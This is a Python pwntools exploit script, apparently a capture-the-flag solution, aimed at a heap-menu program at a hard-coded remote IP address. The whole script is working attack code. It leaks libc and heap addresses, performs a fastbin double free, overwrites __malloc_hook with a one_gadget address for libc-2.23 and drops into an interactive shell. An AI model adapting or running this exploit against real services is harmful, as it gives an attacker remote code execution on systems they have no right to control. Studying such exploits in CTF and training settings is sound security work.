from pwn import *
def cmd(c):
	p.sendlineafter("ice:",str(c))
def add(size,c='A'):
	cmd(2)
	p.sendlineafter("ily:",str(size))
	p.sendafter("daily\n",str(c))
def show():
	cmd(1)
def free(idx):
	cmd(4)
	p.sendlineafter("ily:",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("ily:",str(idx))
	p.sendafter("daily\n",str(c))
context.log_level='debug'
#p=process('./p2')
p=remote("39.106.224.151",58512)
add(0x88,"A")#0
add(0x18,"B")#1
free(0)
add(0x88,"A")#0
show()
p.readuntil("0 : ")
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd1b41-0x00007ffff7a0d000)

add(0x18,"A")#2
free(1)
free(2)
add(0x18,"A")#1
show()
p.readuntil("1 : ")
heap=u64(p.readuntil("=")[:-1].ljust(8,'\x00'))-0x41

add(0x18,p64(0x68)+p64(heap+0xd0+0x10))#2
add(0x68,"A")#3
add(0x68,'A')#4
free(3)
free(4)
idx=(heap+0xa0-0x0602060)//16
free(idx)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc.address=base
add(0x68,p64(libc.symbols['__malloc_hook']-35))#3
add(0x68)#4
add(0x68)#5
one=0xf02a4
add(0x68,'\x00'*19+p64(one+base))
free(3)
free(5)
log.warning(hex(base))
log.warning(hex(heap))
#gdb.attach(p,'b *0x000000000400C16')

p.interactive()
